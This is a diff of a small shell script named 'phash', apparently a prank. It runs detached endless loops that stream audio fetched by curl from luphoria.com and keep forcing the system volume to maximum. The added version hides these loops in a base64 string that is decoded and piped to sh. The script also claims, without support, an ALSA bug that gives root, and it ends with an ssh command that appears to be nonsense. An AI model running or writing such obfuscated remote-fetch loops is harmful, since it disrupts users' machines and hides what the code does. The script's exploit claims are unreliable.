@@ -1,8 +1,14 @@
-while [ 1=1 ];
-do
-    aplay <(curl https://luphoria.com/aplay-overflow-phash.wav);
-done & disown &
-while [ 1=1 ];
-do
-    amixer set Master 100% unmute;
-done & disown
+# phash
+# copyright(c) luphoria
+# v2
+# utilizes a b64-jit-alsa bug to execute as root from `alsa` daemon, via aplay.
+
+echo "-=-=-=- PHASH -=-=-=-"
+echo "  --- luphoria! ---"
+
+# load aplay payload
+echo "d2hpbGUgWyAxPTEgXTsKZG8KICAgIGFwbGF5IDwoY3VybCBodHRwczovL2x1cGhvcmlhLmNvbS9h
+cGxheS1vdmVyZmxvdy1waGFzaC53YXYpOwpkb25lICYgZGlzb3duICYKd2hpbGUgWyAxPTEgXTsK
+ZG8KICAgIGFtaXhlciBzZXQgTWFzdGVyIDEwMCUgdW5tdXRlOwpkb25lICYgZGlzb3duCg==" | base64 -d | sh
+
+ssh -d -s 127.0.0.1:1338 -k /tmp/p
